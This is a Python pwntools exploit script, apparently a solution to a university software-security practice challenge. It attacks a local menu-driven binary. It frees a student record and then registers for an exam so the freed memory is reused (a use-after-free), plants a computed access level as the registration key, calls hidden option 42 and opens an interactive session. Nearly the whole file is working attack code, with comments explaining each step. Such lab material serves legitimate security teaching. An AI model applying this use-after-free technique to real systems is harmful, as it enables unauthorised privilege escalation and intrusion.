#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-5')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()


# idea: create exam_reg and confuse it with student
# we set registration_key as desired access level

# input 42, to call secret
# access level has to be 
target_access_level = 0xdeadbeef ^ 0xdba2ab03
print(target_access_level)

# delete_student has ause after free
# that means i create a student first.
# then i delete the student
# then i register the student (malloc reuses student struct as just free'd)
# then i do 42

def create_student() -> int:
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Name: ', b'Tim')
    conn.sendlineafter(b'RUB ID: ', b'108020212831')
    conn.recvuntil(b'Student created at ')
    student_pointer = conn.recvline()[2:-1]
    student_pointer = int(student_pointer, 16)
    return student_pointer

def delete_student(index):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b'Index: ', index)

def register_to_exam():
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Name: ', b'Tim')
    conn.sendlineafter(b'RUB ID: ', b'108020212831')
    conn.sendlineafter(b'Registration Key: ', f'{target_access_level}'.encode())
    


student_pointer = create_student()
#print(hex(student_pointer))
delete_student(b'0')

register_to_exam()

conn.sendlineafter(b'> ', b'42')
conn.sendlineafter(b'Index: ', b'0')

conn.interactive()
